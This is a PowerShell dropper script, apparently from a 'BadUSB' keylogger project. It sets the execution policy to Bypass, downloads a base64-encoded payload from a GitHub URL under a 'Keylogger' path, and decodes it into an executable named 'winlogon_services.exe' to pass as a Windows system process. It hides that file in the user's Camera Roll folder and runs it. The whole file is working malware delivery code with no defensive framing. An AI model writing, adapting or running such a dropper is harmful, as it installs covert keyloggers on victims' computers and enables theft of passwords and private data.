# Define the name and location of the downloaded and decoded executable
$ScriptName = "winlogon_services.exe"
$DownloadURL = 'https://raw.githubusercontent.com/Chrislundh98/BadUSB/main/Keylogger/encoded-20240308210244.txt'
$EncodedFilePath = Join-Path -Path $env:TEMP -ChildPath "encoded-20240308210244.txt"
$DecodedFilePath = Join-Path -Path $env:USERPROFILE -ChildPath "Pictures\Camera Roll\$ScriptName"
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser
# Download encoded executable
Invoke-WebRequest -Uri $DownloadURL -OutFile $EncodedFilePath

# Decode encoded executable
$EncodedData = Get-Content -Path $EncodedFilePath
$DecodedData = [System.Convert]::FromBase64String($EncodedData)
[System.IO.File]::WriteAllBytes($DecodedFilePath, $DecodedData)


# Execute the application
Start-Process -FilePath $DecodedFilePath
